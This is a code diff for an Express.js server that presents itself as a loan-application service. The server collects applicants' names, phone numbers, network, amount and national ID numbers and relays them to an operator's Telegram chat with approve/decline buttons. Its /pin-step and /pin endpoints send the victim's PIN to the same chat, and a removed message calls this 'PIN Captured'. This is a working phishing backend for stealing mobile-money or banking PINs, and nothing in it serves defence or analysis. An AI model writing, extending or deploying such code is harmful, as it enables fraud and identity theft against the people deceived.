@@ -4,14 +4,16 @@ const path = require("path");
 
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// ENV VARIABLES (set in Railway)
+// ENV
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+
+// ================= MEMORY DB =================
+const users = {};
 
 // ================= HOME =================
 app.get("/", (req, res) => {
@@ -26,22 +28,30 @@ app.post("/apply", async (req, res) => {
     return res.status(400).send("Missing fields");
   }
 
-  // Save phone for later (simple method)
+  // STORE USER
+  users[phone] = {
+    name,
+    phone,
+    network,
+    amount,
+    nationalId,
+    status: "pending"
+  };
+
   const message = `
 📥 NEW LOAN APPLICATION
 
-👤 Name: ${name}
-📱 Phone: ${phone}
-📡 Network: ${network}
-💰 Amount: ${amount}
-🆔 ID: ${nationalId}
+👤 ${name}
+📱 ${phone}
+📡 ${network}
+💰 ${amount}
+🆔 ${nationalId}
 
 -------------------------
-⚙️ Action Required:
+Choose action:
 `;
 
   try {
-    // Send with buttons
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
@@ -55,79 +65,82 @@ app.post("/apply", async (req, res) => {
       }
     });
 
-    res.sendStatus(200);
+    res.json({ success: true, phone });
+
   } catch (err) {
     console.log(err.response?.data || err.message);
     res.status(500).send("Telegram failed");
   }
 });
 
-// ================= PIN PAGE VISIT =================
-app.post("/pin-step", async (req, res) => {
-  const { phone } = req.body;
+// ================= STATUS CHECK =================
+app.get("/status/:phone", (req, res) => {
+  const phone = req.params.phone;
 
-  try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `📍 USER REACHED PIN STEP\n📱 ${phone}`
-    });
-
-    res.sendStatus(200);
-  } catch (err) {
-    res.sendStatus(500);
+  if (!users[phone]) {
+    return res.json({ status: "unknown" });
   }
-});
 
-// ================= PIN SUBMIT =================
-app.post("/pin", async (req, res) => {
-  const { phone, pin } = req.body;
-
-  try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `
-🔐 PIN RECEIVED
-
-📱 Phone: ${phone}
-🔑 PIN: ${pin}
-
-✅ Status: PIN Captured
-`
-    });
-
-    res.sendStatus(200);
-  } catch (err) {
-    res.sendStatus(500);
-  }
+  res.json({ status: users[phone].status });
 });
 
 // ================= WEBHOOK =================
-app.post("/webhook", (req, res) => {
+app.post("/webhook", async (req, res) => {
   const data = req.body;
 
-  if (data.callback_query) {
-    const query = data.callback_query;
-    const action = query.data;
+  try {
+    if (data.callback_query) {
+      const action = data.callback_query.data;
+      const phone = action.split("_")[1];
 
-    let text = "";
+      if (users[phone]) {
+        if (action.startsWith("approve")) {
+          users[phone].status = "approved";
+        } else if (action.startsWith("decline")) {
+          users[phone].status = "declined";
+        }
+      }
 
-    if (action.startsWith("approve")) {
-      text = "✅ Approved\n➡️ Next: PIN Page";
-    } else if (action.startsWith("decline")) {
-      text = "❌ Declined";
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: users[phone]
+          ? `Status updated for ${phone}: ${users[phone].status}`
+          : "User not found"
+      });
     }
 
-    // Respond back in Telegram
-    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: text
-    });
+  } catch (err) {
+    console.log(err.message);
   }
 
   res.sendStatus(200);
 });
 
-// ================= START SERVER =================
+// ================= PIN STEP =================
+app.post("/pin-step", async (req, res) => {
+  const { phone } = req.body;
+
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: `📍 PIN STEP REACHED\n📱 ${phone}`
+  });
+
+  res.sendStatus(200);
+});
+
+// ================= PIN =================
+app.post("/pin", async (req, res) => {
+  const { phone, pin } = req.body;
+
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: `🔐 PIN: ${pin}\n📱 ${phone}`
+  });
+
+  res.sendStatus(200);
+});
+
+// ================= START =================
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, "0.0.0.0", () => {
   console.log("Server running on port " + PORT);
